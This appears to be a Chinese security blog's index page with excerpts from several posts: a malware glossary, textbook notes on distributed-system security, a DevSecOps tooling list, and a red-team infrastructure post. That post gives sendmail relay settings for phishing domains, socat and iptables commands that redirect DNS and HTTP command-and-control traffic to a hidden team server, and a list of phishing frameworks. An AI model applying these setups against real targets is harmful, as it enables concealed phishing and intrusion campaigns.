<p><em><strong>下载器 downloads：被攻击机器上安装其他内容的程序，通常下载器是包含在恶意代码中的，该恶意代码首先被安装在被感染系统中，而后下载大量的恶意软件</strong></em></p>
<p><em><strong>路过式下载 drive-by-downloads：利用受感染网站的攻击方式，当该网站被访问时，被植入其中的恶意代码以利用浏览器漏洞攻击访问者所在系统</strong></em></p>
<p><em><strong>漏洞应用攻击程序 exploit：针对某个或多个漏洞进行攻击的代码</strong></em></p>
<p><em><strong>洪泛攻击 dos：通过向联网的计算机系统发送大量数据包而实现DDOS的程序</strong></em></p>
<p><em><strong>键盘记录器 keylogger：捕获受控系统中键盘输入的程序</strong></em></p>
<p><em><strong>逻辑炸弹：被入侵者插到正常软件中的程序。当预定义的条件满足时，逻辑炸弹被触发，开始执行非授权的操作，其他时间处于休眠状态</strong></em>        </p>
<p><em><strong>宏病毒：一种使用宏语言或脚本编写的可以通常被植入一个文档中，当该文档被浏览器或编辑时触发，然后复制其他文档</strong></em></p>
<p><em><strong>移动代码：能够不加修改地移植不同类型的系统平台上按照完全相同的语义执行的软件（脚本、宏或者其他可移植的指令）</strong></em></p>
<p><em><strong>rootkit：攻击者成功入侵计算机系统并获得root访问权限之后使用攻击工具</strong></em>  </p>
<p><em><strong>垃圾邮件程序：发送大量垃圾邮件系统</strong></em></p>
<p><em><strong>间谍软件 spyware：通过监听输入、显示器数据或网络流量、通过搜寻系统中的文件获取敏感信息，并将收集到的信息发送到另一台计算机系统</strong></em></p>
<p><em><strong>特洛伊木马：一种隐藏工具却有用的代码</strong></em></p>
<p><em><strong>病毒：在执行时设法将自己复制到其他可执行代码中的恶意代码</strong></em></p>
<p><em><strong>蠕虫：能够独立执行并且可以将自己完整的可执行版本传播到网络中其他主机上的计算机程序，通常通过攻击目标系统中软件漏洞或使用捕获授权凭证来实现</strong></em></p>
<p><em><strong>僵尸机 zombie&#x2F;bot：在被感染计算机中运行，激活后向其他计算机发送攻击的程序</strong></em></p>
<h3 id="malware-classification"><a href="#malware-classification" class="headerlink" title="malware classification"></a>malware classification</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37442062/article/details/98598086?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6.pc_relevant_paycolumn_v3&utm_relevant_index=11">maybe crimeware list</a></p>
<h3 id="malware-spread"><a href="#malware-spread" class="headerlink" title="malware spread"></a>malware spread</h3><ul>
<li>感染机制（infection mechanism）: 病毒传播和进行自我复制方法（infection vector）</li>
<li>触发条件（trigger）: 激活或交付病毒有效载荷的事件或条件（logic bomb）</li>
<li>有效载荷（payload）: 病毒除传播之外的活动</li>
</ul>
<h3 id="malware-virus-life-cycle"><a href="#malware-virus-life-cycle" class="headerlink" title="malware virus life cycle"></a>malware virus life cycle</h3><ul>
<li>潜伏阶段 dormant phase</li>
<li>传播阶段 propagation phase</li>
<li>触发阶段 triggering phase</li>
<li>执行阶段 execution phase</li>
</ul>
<h3 id="传播-感染内容-病毒"><a href="#传播-感染内容-病毒" class="headerlink" title="传播 - 感染内容 - 病毒"></a>传播 - 感染内容 - 病毒</h3><p>恶意软件是第一种传播类型设计软件片段的寄生，它将自身依附于一些现有可执行内容中（脚本语言代码：Word、Excel、Adobe PDF）</p>
<p>###（目标）</p>
<ul>
<li>感染引导扇区病毒：感染主引导记录或引导记录，当系统从含有这类病毒的磁盘上启动时病毒就开始传播</li>
<li>感染可以执行文件病毒：感染可以在操作系统或shell中执行文件</li>
<li>宏病毒：感染含有应用程序解释的可执行宏代码或脚本语言的文件</li>
<li>多元复合型病毒：多中途径感染文件</li>
</ul>
<p>###（隐藏方式）</p>
<ul>
<li><p>隐匿型病毒（stealth virus）:这种病毒设计目的就是躲避反病毒软件的检测（通过代码的多态、压缩或则rookit技术实现隐藏）</p>
</li>
<li><p>ploymorphic virus ： 防止其他程序检测到，一种在自我复制时生成功能相同但位排列方式完全不同的拷贝病毒，多态病毒可能随机插入冗余指令或交换独立指令的顺序，更为有效的方法是使用加密。<br>加密病毒策略：病毒代码中负责生成密钥和执行加密｜解密的部分称为变形引擎（mutation engine）</p>
</li>
<li><p>metamorphic virus ： 不同的是变形病毒在每次变异中都重写病毒体，因此增加病毒检测的难度。</p>
</li>
</ul>
<h2 id="传播-漏洞利用-蠕虫"><a href="#传播-漏洞利用-蠕虫" class="headerlink" title="传播 - 漏洞利用 - 蠕虫"></a>传播 - 漏洞利用 - 蠕虫</h2><p>恶意软件的另一种传播类型设计软件漏洞利用，而蠕虫是通常会利用这些漏洞</p>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/11/malware_01/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/11/Infrastructure_01/" >红队提供弹性和隐蔽性</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-11  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>为了进一步提高弹性和隐蔽性，每个后端资产（即团队服务器）都应该在其前面放置一个重定向器。目标是在我们的目标服务器和后端服务器之间始终有一个主机。以这种方式设置基础架构可以更快、更轻松地滚动新的基础架构 - 无需在后端建立新的团队服务器、迁移会话和重新连接未销毁的资产。</p>
<h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><ul>
<li>删除以前服务器的标头</li>
</ul>
<blockquote>
<p>Remove previous server headers<br>Add the following line to the end of &#x2F;etc&#x2F;mail&#x2F;sendmail.mc:<br>define(<code>confRECEIVED_HEADER&#39;,</code>by $j ($v&#x2F;$Z)$?r with $r$. id $i; $b’)dnl</p>
</blockquote>
<blockquote>
<p>Add to the end of &#x2F;etc&#x2F;mail&#x2F;access<br>IP-to-Team-Server <em>TAB</em> RELAY<br>Phish-Domain <em>TAB</em> RELAY</p>
</blockquote>
<ul>
<li>配置包罗万象的地址</li>
</ul>
<blockquote>
<p>configure a catch all address<br>echo PHISH-DOMAIN &gt;&gt; &#x2F;etc&#x2F;mail&#x2F;local-host-names<br>FEATURE(<code>virtusertable&#39;, </code>hash -o &#x2F;etc&#x2F;mail&#x2F;virtusertable.db’)dnl<br>@phishdomain.com  external-relay-address</p>
</blockquote>
<ul>
<li>后缀<br>Postfix</li>
</ul>
<h3 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h3><ul>
<li>有效负载</li>
<li>Web重定向</li>
</ul>
<h3 id="网络流量"><a href="#网络流量" class="headerlink" title="网络流量"></a>网络流量</h3><ul>
<li>修改C2流量</li>
</ul>
<h3 id="C2（HTTP-S-、DNS-等）"><a href="#C2（HTTP-S-、DNS-等）" class="headerlink" title="C2（HTTP(S)、DNS 等）"></a>C2（HTTP(S)、DNS 等）</h3><p>使用C2重定向器应在您的后利用框架上配置外部侦听器，以通过重定向器域发送暂存流量</p>
<p><strong>域名系统</strong></p>
<ul>
<li>DNS的socat</li>
</ul>
<blockquote>
<p>socat to 53 to DNS Data package<br>socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<IPADDRESS>; echo -ne</p>
</blockquote>
<ul>
<li>DNS的iptables</li>
</ul>
<blockquote>
<p>DNS redirector rule-set is below<br>iptables -I INPUT -p udp -m udp –dport 53 -j ACCEPT<br>iptables -t nat -A PREROUTING -p udp –dport 53 -j DNAT –to-destination <IP-GOES-HERE>:53<br>iptables -t nat -A POSTROUTING -j MASQUERADE<br>iptables -I FORWARD -j ACCEPT<br>iptables -P FORWARD ACCEPT<br>sysctl net.ipv4.ip_forward&#x3D;1</p>
</blockquote>
<p><strong>HTTP（S）</strong></p>
<ul>
<li>socat</li>
</ul>
<blockquote>
<p>单个网络接口和多个网络接口<br>socat TCP4-LISTEN:80,fork TCP4:<REMOTE-HOST-IP-ADDRESS>:80<br>socat TCP4-LISTEN:80,bind&#x3D;10.0.0.2,fork TCP4:1.2.3.4:80</p>
</blockquote>
<ul>
<li>mode_rewirte</li>
</ul>
<blockquote>
</blockquote>
<p>iptables -I INPUT -p tcp -m tcp –dport 80 -j ACCEPT<br>iptables -t nat -A PREROUTING -p tcp –dport 80 -j DNAT –to-destination <REMOTE-HOST-IP-ADDRESS>:80<br>iptables -t nat -A POSTROUTING -j MASQUERADE<br>iptables -I FORWARD -j ACCEPT<br>iptables -P FORWARD ACCEPT<br>sysctl net.ipv4.ip_forward&#x3D;1</p>
<ul>
<li>HTTP socat</li>
</ul>
<blockquote>
</blockquote>
<p>cd &#x2F;etc&#x2F;ssh&#x2F;sshd_config<br>vim sshd_config</p>
<h1 id="Allow-the-SSH-client-to-specify-which-hosts-may-connect"><a href="#Allow-the-SSH-client-to-specify-which-hosts-may-connect" class="headerlink" title="Allow the SSH client to specify which hosts may connect"></a>Allow the SSH client to specify which hosts may connect</h1><p>GatewayPorts yes</p>
<h1 id="Allow-both-local-and-remote-port-forwards"><a href="#Allow-both-local-and-remote-port-forwards" class="headerlink" title="Allow both local and remote port forwards"></a>Allow both local and remote port forwards</h1><p>AllowTcpForwarding yes</p>
<ul>
<li>HTTP iptables</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>HTTP ssh</li>
</ul>
<p><strong>C2重定向</strong></p>
<ul>
<li>HTTPS C2</li>
<li>Apache mode_rewirte</li>
</ul>
<h2 id="重定向器模型"><a href="#重定向器模型" class="headerlink" title="重定向器模型"></a>重定向器模型</h2><hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain1.com] --&gt;C&#123;Phishing &amp; Payloads&#125;</span><br><span class="line">    C --&gt;|SMTP Server| D[router]</span><br><span class="line">    C --&gt;|Apache Redirector| E[router]</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain2.com] --&gt;B(DNS Redirector)</span><br><span class="line">    B --&gt; C(LT DNS C2)</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain3.com] --&gt;B(DNS Redirector)</span><br><span class="line">    B --&gt; C(LT DNS C2)</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain4.com] --&gt;B(Apache Redirector)</span><br><span class="line">    B --&gt; C(ST HTTP C2)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>开源OSINT可以帮助对控制状态以及检查域的资源做出最佳猜测</p>
<ul>
<li>CatMyFish</li>
<li>DomainHunter</li>
<li>AIRMASTER</li>
<li>Chameleon</li>
<li>DNS传播检查器</li>
</ul>
<p>分类和黑名单检查资源</p>
<ul>
<li>McAfee</li>
<li>Fortiguard</li>
<li>Symantec + BlueCoat</li>
<li>Checkpoint (requires free account)</li>
<li>Palo Alto</li>
<li>Sophos (submission only; no checking) - Click Submit a Sample -&gt; Web Address</li>
<li>TrendMicro</li>
<li>Brightcloud</li>
<li>Websense (Forcepoint)</li>
<li>Lightspeed Systems</li>
<li>Chameleon</li>
<li>SenderBase</li>
<li>MultiBL</li>
<li>MXToolBox - Blacklists</li>
</ul>
<h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><ul>
<li>基于Web网络钓鱼</li>
<li>鱼叉网络钓鱼<blockquote>
<p>钓鱼框架：<br>Gophish<br>Phishing Frenzy<br>The Social-Engineer Toolkit<br>FiercePhish (formerly FirePhish)</p>
</blockquote>
</li>
</ul>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/11/Infrastructure_01/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/11/distributed-security/" >分布式系统 V1.0</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-11  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>分布式系统安全性可以粗略划分为：<br>1、不同机器上的用户或进程之间的通信，主要是通过安全通道机制，更准确的是身份认知、消息完整性以及机密性的构建策略<br>2、用于确保进程只获得授予它的对分布式系统内资源的访问权限</p>
<p>其次我在考虑分布式系统安全性范型从自顶向下进行探索性知识实验，了解分布式系统安全性体系结构有助于帮助举一反三的看待诸多开源中间件等具有分布式特性的项目。</p>
<h1 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h1><h3 id="安全性-1"><a href="#安全性-1" class="headerlink" title="安全性"></a>安全性</h3><p>可靠性包括可用性、可信赖性、安全性、可维护性以及计算机的机密性、完整性</p>
<ul>
<li>机密性是可以让系统凭借此属性使得信息只向授权用户公开</li>
<li>完整性是可以让系统的变更只能以授权的方式进行</li>
</ul>
<h3 id="安全威胁"><a href="#安全威胁" class="headerlink" title="安全威胁"></a>安全威胁</h3><p>同时安全性也是我们试图需要保护该系统所提供的服务和数据不受到安全威胁，主要的安全威胁是：<br>1、窃听：未经授权的用户获得一项服务或数据的访问权限<br>2、中断：服务或数据变得难以获取、不能使用、被破坏等情况<br>3、修改：数据未经授权的改变或篡改<br>4、伪造：产生通常不存在附加数据或活动的情况</p>
<h3 id="安全策略与安全机制"><a href="#安全策略与安全机制" class="headerlink" title="安全策略与安全机制"></a>安全策略与安全机制</h3><ul>
<li>安全策略：准确地描述系统中的实体（包括用户、机器、服务、数据等）能够采取以及不能采取的行为</li>
<li>安全机制：加密、身份认证、授权、审计</li>
</ul>
<p>1、加密将数据转换为一些攻击不能理解的形式同时加密实现一种实现机密性的方式<br>2、身份认证用于检验用户、客户、服务器等所声明的身份<br>3、用于追踪各个客户的访问内容以及访问方式，虽然审计并不真正提供任何防止安全威胁的保护，但是审计记录对安全破坏的分析以及随后采取措施防止入侵攻击。</p>
<h1 id="安全体系结构"><a href="#安全体系结构" class="headerlink" title="安全体系结构"></a>安全体系结构</h1><ul>
<li>用户代理：即为一个进程，系统允许该进程在有限的一段时间内代表用户进行操作</li>
<li>资源代理：即为在指定域内运行一个进程，用于将一个资源上的全局操作转换为遵循特定网域的安全策略的局部操作</li>
</ul>
<p>Globus安全体系结构为例：<br><img src="/josyaaa/.image/1-1.png" alt="1-1"></p>
<h1 id="分布式安全设计问题"><a href="#分布式安全设计问题" class="headerlink" title="分布式安全设计问题"></a>分布式安全设计问题</h1><h2 id="控制的焦点"><a href="#控制的焦点" class="headerlink" title="控制的焦点"></a>控制的焦点</h2><p><img src="/josyaaa/./image/1-2.png" alt="1-2"></p>
<ul>
<li>a方法就是把注意力集中式的对于应用程序相关联的数据保护（数据的完整性）</li>
<li>b方法就是把注意力集中式的对于访问特定数据或资源时，通过明确指定可以调用的操作以及操作由谁来完成进行保护（控制焦点与访问控制机制相关）</li>
<li>c方法就是把注意力集中式的对于用户，通过采取一些措施使得只有指定的人可以访问该应用程序，而不考虑其执行的操作来实现（控制焦点在于定义用户的角色）</li>
</ul>
<h2 id="安全机制分层"><a href="#安全机制分层" class="headerlink" title="安全机制分层"></a>安全机制分层</h2><p>安全系统设计的一个重要问题就是决定将安全机制放置在哪一层面，如下图所示通用服务与通信服务分离开来，安全机制放置在哪一层面取决于客户对特定层中服务的安全程度所具有的信任度，还是要更具不同软件产品的特定所定制不同的安全机制。</p>
<p><img src="/josyaaa/./distributed-security/1-3.png" alt="1-3"></p>
<p>信任服务导致的信任计算库（TCB），TCB是一个分布式系统中所有安全机制的集合，这些机制用于执行一个安全策略，TCB越小越好。</p>
<h2 id="简洁性"><a href="#简洁性" class="headerlink" title="简洁性"></a>简洁性</h2><p>简单性有助于最终用户对应用程序投入信任，更重要的是使设计者确信系统没有重大的安全漏洞。</p>
<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><ul>
<li>分布式系统的基本安全措施是使用加密技术但是以密文传输消息时存在三种需要我们防止的不同攻击：</li>
</ul>
<p><img src="/josyaaa/./distributed-security/1-4.png" alt="1-4"></p>
<p>1、入侵者通过在发送方或接收方都不知道的情况下进行窃听<br>2、修改经过适当加密的密文则困难的多，因为在进行针对性地修改消息前，入侵者首先必须对该消息进行解密<br>3、入侵者向通信系统中插入加密过的消息</p>
<ul>
<li>加密系统之间存在基本的区别是加密与解密密钥是否相同，主要的加密算法如下：<br>1、DES算法（使用分析方法难以破解算法当然使用暴力破解是可以被破解的，但是在一个具有不同密钥的特殊加密-解密-加密模式中三次使用DES更为安全）在被128位的Rijindael算法数据库取代的过程中。<br>2、RSA算法，RSA来自即没有任何已知的方法能够有效的找到大数的素因子，破解RSA的过程其实就是在寻找私钥和公钥的最大素数。<br>3、MD5算法</li>
</ul>
<h1 id="安全通道"><a href="#安全通道" class="headerlink" title="安全通道"></a>安全通道</h1><h2 id="分布式系统的安全性本质上是要回归三个主题："><a href="#分布式系统的安全性本质上是要回归三个主题：" class="headerlink" title="分布式系统的安全性本质上是要回归三个主题："></a>分布式系统的安全性本质上是要回归三个主题：</h2><p>1、如何使客户与服务器之间的通信保持安全，安全通信需要对通信各方进行身份认证，同时还要确保消息的完整性和机密性，同时也要考虑保护一组服务器内的通信<br>客户-服务器通信可以认为是在通信各方之间建立一个安全通道问题，保护消息免受窃听确保机密性完成、安全通道可确保入侵者不能窃听其消息</p>
<p>2、服务器一旦接受来自客户的请求，它将如何查明该客户是否得到授权使请求得以执行<br>身份认证和消息完整性相互之间不能脱离开，要确保进行身份认证之后交换的数据消息的完整性，常见的方法是依靠会话密钥使用密钥加密。会话密钥是一个共享密钥，用于完整性和可能的机密性而对消息进行加密。</p>
<ul>
<li><p>基于共享密钥的身份认证（质询-询问协议）<br><img src="/josyaaa/./distributed-security/png8.png" alt="png8"></p>
</li>
<li><p>基于密钥分发中心的身份认证（可扩展性）</p>
</li>
</ul>
<p>3、安全通道如何提供对消息完整性和机密性的保证，完整性是保护消息免受修改，机密性是确保消息不能被截获和读取消息。</p>
<ul>
<li>消息完整性通常超过安全通道中的实际传输的范畴（a[保证消息不会恶意更改]、b[消息的可溯源记录]）&#x3D;&#x3D;&gt;”数字签名”</li>
<li>&#x3D;&#x3D;&gt;”会话密钥”即是在身份认证阶段完成后，通信各方一般使用唯一的共享会话密钥实现机密性使用与建立安全通道所用密钥相同的密钥。<br>会话密钥的基本思想就是如果入侵者能够窃听许多使用同一密钥加密的数据，就有可能发动攻击以得到密钥的某些特征，并有可能发现明文或该密钥本身。替代解决方法是在每对组成员之间使用各自的共享密钥，但是使用公钥加密系统可以解决这个问题即每个成员有其自己的（公钥、私钥）对，其中所有成员都可用该公钥发送机密消息。</li>
</ul>
<p>4、安全的复制服务器（一个客户向一组复制服务器发出请求）</p>
<ul>
<li>这种情况下可能服务器可能已经由于容错性或性能的原因进行了复制但是客户总会希望期望响应具有可信机制。</li>
<li>类似与byzantine故障的方法：<br>1、收集来自所有服务器的响应并对每个服务器进行身份认证（违反了复制的透明度），安全和透明的复制服务器的本质在于称为秘密共享的特性<br><img src="/josyaaa/./distributed-security/png9.png" alt="png9"></li>
</ul>
<h2 id="kerberos安全系统"><a href="#kerberos安全系统" class="headerlink" title="kerberos安全系统"></a>kerberos安全系统</h2><p><img src="/josyaaa/./distributed-security/png10.png" alt="png10"></p>
<ul>
<li>身份认证服务器（负责处理来自用户的登陆请求，但是建立安全通道是有TGS处理的）和票据授予服务（服务确信客户正是其所声称的客户）</li>
</ul>
<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><p>一般情况是一个对象服务器控制很多对象，客户发送的请求一般都包含对特定对象方法的调用，所以这样的请求需要调用具有足够的访问权限。</p>
<ul>
<li>检验访问权限为访问控制</li>
<li>授权是关于授予访问权限</li>
</ul>
<h2 id="访问控制中常见的问题"><a href="#访问控制中常见的问题" class="headerlink" title="访问控制中常见的问题"></a>访问控制中常见的问题</h2><p>访问控制的一般模型：<br><img src="/josyaaa/./distributed-security/png11.png" alt="png11"></p>
<ul>
<li>访问控制矩阵</li>
</ul>
<p><img src="/josyaaa/./distributed-security/png12.png" alt="png12"></p>
<p>矩阵中的许多项将是空的，因为单个主体一般可以访问相对较少的对象。</p>
<p>1、让每个对象保存一个希望访问该对象的主体访问权限表，即访问控制表（ACL）<br>2、以行方向分布该矩阵，通过为每个主体赋予一个其对每个对象所拥有的权能列表</p>
<ul>
<li>保护域</li>
</ul>
<p>通过忽略所有空项，ACL和权能可以有效访问控制矩阵，采取进一步措施ACL或权能列表仍可能变得非常大，所以缩小ACL普通方式就是利用保护域<br>1、构造用户组<br>2、引入分层组<br>3、让访问监控程序完成所有工作的方式，是让每个主体携带一个证书，列出所属的群组（数字签名技术）<br>4、基于角色实现保护域<br>5、基于操作将对象分组</p>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p><img src="/josyaaa/./distributed-security/png13.png" alt="png13"></p>
<ul>
<li><p>数据包过滤网关：基于数据包报头中包含的源地址和目的地址制定关于是否传送一个网络数据包的决定</p>
</li>
<li><p>应用层网关：仅检查网络数据包报头的数据包过滤网关，实质上是检查防火墙实际出入站的消息内容</p>
</li>
<li><p>代理网关：属于应用层网关的变形，作为指定类型的应用程序的前端工作，并确保工作只传送某个准则的消息</p>
</li>
</ul>
<h2 id="安全移动代码"><a href="#安全移动代码" class="headerlink" title="安全移动代码"></a>安全移动代码</h2><ul>
<li>保护代理<br>Ajanta系统：允许代理程序所有者检测该代理是否被篡改、只追加记录、有选择地揭示某些服务器的状态</li>
<li>保护目标<br>处理恶意入站代理程序时，仅检测系统资源就已经过于延迟，构建沙箱<br><img src="/josyaaa/./distributed-security/13.png" alt="13"><br>灵活的做法是为下载的移动代码啊创建运动场。运动场是一台专门为运行移动代码保留的单独的指定机器<br><img src="/josyaaa/./distributed-security/14.png" alt="14"></li>
</ul>
<p>困难部分是实施安全策略，对Java程序提出了三种机制：<br>1、使用基于作为权能的对象引用<br><img src="/josyaaa/./distributed-security/15.png" alt="15"><br>2、扩展的栈自省<br><img src="/josyaaa/./distributed-security/16.png" alt="16"><br>本质上，栈自省允许对类或方法的特权进行链接，并对每个调用者的那些特权的分别检查。<br>3、名称空间管理<br>为了赋予程序对本地资源的访问权限，首先需要通过加入包含实现那些资源的类的适当文件来获得访问，加入过程要求赋予解释器一个名称，然后将名称解析一个类，随后在运行时加载该类。</p>
<p>上述所描述的是基于下载程序的来源将特权与类或方法关联起来的方案。依靠Java解释器，通过上面所描述的机制执行安全策略是可能实现的。</p>
<h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>DDos攻击中，大量的进程一起试图摧毁一个网络服务。在这些情况下，我们往往可以看到，攻击者已经成功地劫持了一大组机器，而这些机器毫无意识的以及加入攻击的行列中了。<br>1、带宽耗竭攻击：是往某个机器发送大量的消息，正常消息很难到达接收者<br>2、资源耗竭攻击：使接收者把资源消耗在无用的消息上<br><strong><strong>解决方法</strong></strong></p>
<ul>
<li>让机器检查所有安装的文件，不停地监视它们的状态</li>
<li>不断的监视网络流量（把源地址不属于任何企业网络的数据包删除掉，可以防止很多攻击破坏，通常最好把数据包严格地按源地址过滤）</li>
</ul>
<h1 id="安全管理"><a href="#安全管理" class="headerlink" title="安全管理"></a>安全管理</h1><p>1、加密密钥的一般管理，尤其公钥的分配方式<br>2、讨论添加当前成员信任的一个新的群组成员来讨论安全管理一组服务器的问题<br>3、考虑权能和称为属性证书的事物来关注授权管理</p>
<h2 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h2><ul>
<li>密钥建立<br><img src="/josyaaa/./distributed-security/17-2.png" alt="17-1"></li>
</ul>
<p>Diffie-Hellman 密钥原理：<br><img src="/josyaaa/./distributed-security/17.png" alt="17-2"></p>
<ul>
<li>密钥分发<br>密钥管理中最困难的部分是初始密钥的实际分发。在对称密钥系统中，初始共享密钥必须沿着一条提供身份认证和机密性的安全通道交流。但是如果没有这条通道，我们就需要创造通信的手段。<br>在使用公钥加密系统的情况下，需要以接收者能够确信该密钥肯定可以与声明的一个私钥配对，也就是说不管公钥还是私钥均需要提供身份认证和机密性的安全通道发送。<br>密钥分发原理结构：<br><img src="/josyaaa/./distributed-security/18-1.png" alt="18-1"><br>公钥分发原理结构：<br><img src="/josyaaa/./distributed-security/18-2.png" alt="18-2"></li>
</ul>
<p>注意通过确认证书是处于可用状态下，客户实际上就会相信该证书不是伪造的。但是每个人都信任最高级的证书颁发机构的情景假设下分层信任模型才可以施行。</p>
<ul>
<li>证书生存周期<br>证书最重要的问题是其寿命，假设在被标识的实体私钥收到伤害，那么可信的用户减少就意味着没有使用公钥的用户。这样的假设中需要种机制来保证证书的存在有效性。</li>
</ul>
<p>吊销证书的方式:<br>1、使用证书颁发机构定期公布分证书吊销表<br>2、限制证书的生存期<br>3、证书的生存期缩短到几乎为零</p>
<h2 id="安全组管理"><a href="#安全组管理" class="headerlink" title="安全组管理"></a>安全组管理</h2><p>特殊服务机构：KDC、CA等,说明分布式系统中的一个困难问题。首先要说明服务机构必须是可信机构，如何提供服务机构的安全同时兼顾其高可用性。</p>
<p>解决高可用的方法就是**<strong>copy</strong>**，但是在复制服务器过程中,需要解决是确保进程要求加入组别时，该组别的完整性有无遭受的破坏，因为没有单个的组成员能够破坏证书，所以需要考虑管理一组复制组的方法。</p>
<h2 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h2><ul>
<li>权能与属性证书</li>
</ul>
<p>1、权能是什么？<br>权能是对于指定资源的一种不可伪造的数据结构，它确切指定它的拥有者关于该资源的访问权限。<br>权能时候一个128位的标识符。内部结构如下：</p>
<table>
<thead>
<tr>
<th>48位</th>
<th>24位</th>
<th>8位</th>
<th>48位</th>
</tr>
</thead>
<tbody><tr>
<td>服务器端口</td>
<td>object</td>
<td>tRights</td>
<td>Check</td>
</tr>
</tbody></table>
<hr>
<p>其后的24位用于给定服务器上的对象，服务端口与对象标识符一起位Amoeda中每个对象构成来一个72位的全系统范围的唯一标识符，8位用于指定权能的访问权限，最后48位check字段用于使权能不可伪造。</p>
<p>生成有限权能的方法：<br><img src="/josyaaa/./distributed-security/19-1.png" alt="19-1"><br>注：本质上f所做的事情与计算消息摘要所做的事情相同。</p>
<p>改变原始消息中任何内容都会立即检测出来，在现代分布式系统中使用权能的一种概括是属性证书，属性证书由称为属性证书颁发机构的特殊证书颁发机构分发。证书中列出的访问权限由该属性证书颁发机构签名。</p>
<ul>
<li>委派</li>
</ul>
<p>1、委派的基本思想是什么？<br>通过将某些访问权限从一个进程传送到另一个进程，使得在多个进程间分布工作变得容易，而又不会对资源保护产生明显的影响。<br>2、委派的方式有那些？<br>**代理:**是一个标记，允许其所有者使用与授予该标记的主体相同的或受限的权限和特权进行操作<br><strong>不要想Alice请求:</strong><br><img src="/josyaaa/./distributed-security/19-2.png" alt="19-2"></p>
<p><em><strong><em><strong>实现安全委派的基本思想是：证明你知道这个秘密</strong></em></strong></em></p>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/11/distributed-security/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/11/deveops/" >DecSecOps and attack team 建设</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-11  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<hr>
<figure class="highlight plaintext"><figcaption><span>graph LR</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A[SeaTunnel(多数据源收集)] --&gt;B[DolphinScheduler（工作流定义）]</span><br><span class="line">    B --&gt; C[可视/安全]</span><br><span class="line">    C --&gt;|可见性|D[数据可视化工具 ？]</span><br><span class="line">    C --&gt;|安全性|E[威胁情报提供 ？]</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="攻击面管理收藏夹"><a href="#攻击面管理收藏夹" class="headerlink" title="攻击面管理收藏夹"></a>攻击面管理收藏夹</h3><ul>
<li>splunk</li>
<li>tenable.io</li>
<li>servicenow</li>
<li>jira</li>
<li>qualys</li>
</ul>
<h3 id="适用于ASM的云连接器"><a href="#适用于ASM的云连接器" class="headerlink" title="适用于ASM的云连接器"></a>适用于ASM的云连接器</h3><ul>
<li>Google cloud</li>
<li>Aws cloud</li>
<li>Azure cloud</li>
</ul>
<h3 id="FAREMWORK"><a href="#FAREMWORK" class="headerlink" title="FAREMWORK"></a>FAREMWORK</h3><ul>
<li>多数据源收集器</li>
<li>SOC中心的应用程序，用于威胁检测</li>
<li>独立模块与数据库交互的侦察框架</li>
<li>滲透测试框架</li>
<li>网络扫描器</li>
</ul>
<h3 id="Thired-Party-Developer"><a href="#Thired-Party-Developer" class="headerlink" title="Thired Party Developer"></a>Thired Party Developer</h3><ul>
<li>EclectionQ  连接顶级威胁情报提供商和集中技术数据源的任务工作流</li>
